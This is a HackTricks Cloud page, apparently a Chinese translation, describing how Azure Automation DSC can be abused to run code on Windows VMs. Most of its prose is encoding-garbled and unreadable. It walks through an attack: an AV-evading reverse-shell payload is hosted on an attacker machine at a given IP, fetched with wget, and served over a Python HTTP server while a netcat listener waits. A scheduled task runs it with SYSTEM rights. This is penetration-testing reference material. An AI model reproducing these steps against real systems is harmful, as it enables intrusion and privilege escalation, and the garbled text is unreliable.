# Az - State Configuration RCE

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

**æŸ¥çœ‹å®Œæ•´å¸–å­ï¼š** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### è¿œç¨‹æœåŠ¡å™¨ (C2) åŸºç¡€è®¾æ–½å‡†å¤‡å’Œæ­¥éª¤æ¦‚è¿°

#### æ¦‚è¿°

è¯¥è¿‡ç¨‹æ¶‰åŠè®¾ç½®ä¸€ä¸ªè¿œç¨‹æœåŠ¡å™¨åŸºç¡€è®¾æ–½ï¼Œä»¥æ‰˜ç®¡ä¸€ä¸ªä¿®æ”¹è¿‡çš„ Nishang `Invoke-PowerShellTcp.ps1` æœ‰æ•ˆè½½è·ï¼Œå‘½åä¸º `RevPS.ps1`ï¼Œæ—¨åœ¨ç»•è¿‡ Windows Defenderã€‚è¯¥æœ‰æ•ˆè½½è·ä» IP ä¸º `40.84.7.74` çš„ Kali Linux æœºå™¨ä¸Šé€šè¿‡ä¸€ä¸ªç®€å•çš„ Python HTTP æœåŠ¡å™¨æä¾›ã€‚æ“ä½œé€šè¿‡å‡ ä¸ªæ­¥éª¤æ‰§è¡Œï¼š

#### æ­¥éª¤ 1 â€” åˆ›å»ºæ–‡ä»¶

* **æ‰€éœ€æ–‡ä»¶ï¼š** éœ€è¦ä¸¤ä¸ª PowerShell è„šæœ¬ï¼š
1. `reverse_shell_config.ps1`ï¼šä¸€ä¸ªè·å–å¹¶æ‰§è¡Œæœ‰æ•ˆè½½è·çš„æœŸæœ›çŠ¶æ€é…ç½® (DSC) æ–‡ä»¶ã€‚å¯ä»¥ä» [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1) è·å–ã€‚
2. `push_reverse_shell_config.ps1`ï¼šä¸€ä¸ªå°†é…ç½®å‘å¸ƒåˆ°è™šæ‹Ÿæœºçš„è„šæœ¬ï¼Œä½äº [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)ã€‚
* **å®šåˆ¶ï¼š** è¿™äº›æ–‡ä»¶ä¸­çš„å˜é‡å’Œå‚æ•°å¿…é¡»æ ¹æ®ç”¨æˆ·çš„ç‰¹å®šç¯å¢ƒè¿›è¡Œè°ƒæ•´ï¼ŒåŒ…æ‹¬èµ„æºåç§°ã€æ–‡ä»¶è·¯å¾„å’ŒæœåŠ¡å™¨/æœ‰æ•ˆè½½è·æ ‡è¯†ç¬¦ã€‚

#### æ­¥éª¤ 2 â€” å‹ç¼©é…ç½®æ–‡ä»¶

* å°† `reverse_shell_config.ps1` å‹ç¼©ä¸º `.zip` æ–‡ä»¶ï¼Œä»¥ä¾¿å‡†å¤‡ä¼ è¾“åˆ° Azure å­˜å‚¨å¸æˆ·ã€‚
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 â€” è®¾ç½®å­˜å‚¨ä¸Šä¸‹æ–‡å¹¶ä¸Šä¼ 

* å‹ç¼©çš„é…ç½®æ–‡ä»¶ä½¿ç”¨ Azure çš„ Set-AzStorageBlobContent cmdlet ä¸Šä¼ åˆ°é¢„å®šä¹‰çš„ Azure å­˜å‚¨å®¹å™¨ azure-pentestã€‚
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Step 4 â€” å‡†å¤‡ Kali Box

* Kali æœåŠ¡å™¨ä» GitHub ä»“åº“ä¸‹è½½ RevPS.ps1 æœ‰æ•ˆè½½è·ã€‚
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* è„šæœ¬è¢«ç¼–è¾‘ä»¥æŒ‡å®šç›®æ ‡ Windows è™šæ‹Ÿæœºå’Œåå‘ shell çš„ç«¯å£ã€‚

#### Step 5 â€” å‘å¸ƒé…ç½®æ–‡ä»¶

* é…ç½®æ–‡ä»¶è¢«æ‰§è¡Œï¼Œå¯¼è‡´åå‘ shell è„šæœ¬è¢«éƒ¨ç½²åˆ° Windows è™šæ‹Ÿæœºçš„æŒ‡å®šä½ç½®ã€‚

#### Step 6 â€” æ‰˜ç®¡æœ‰æ•ˆè´Ÿè½½å¹¶è®¾ç½®ç›‘å¬å™¨

* å¯åŠ¨ä¸€ä¸ª Python SimpleHTTPServer æ¥æ‰˜ç®¡æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶è®¾ç½®ä¸€ä¸ª Netcat ç›‘å¬å™¨ä»¥æ•è·ä¼ å…¥è¿æ¥ã€‚
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* è®¡åˆ’ä»»åŠ¡æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼Œè·å¾—SYSTEMçº§åˆ«çš„æƒé™ã€‚

#### ç»“è®º

è¯¥è¿‡ç¨‹çš„æˆåŠŸæ‰§è¡Œä¸ºè¿›ä¸€æ­¥çš„æ“ä½œæ‰“å¼€äº†ä¼—å¤šå¯èƒ½æ€§ï¼Œä¾‹å¦‚å‡­è¯è½¬å‚¨æˆ–å°†æ”»å‡»æ‰©å±•åˆ°å¤šä¸ªè™šæ‹Ÿæœºã€‚è¯¥æŒ‡å—é¼“åŠ±åœ¨Azure Automation DSCé¢†åŸŸç»§ç»­å­¦ä¹ å’Œåˆ›é€ ã€‚

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
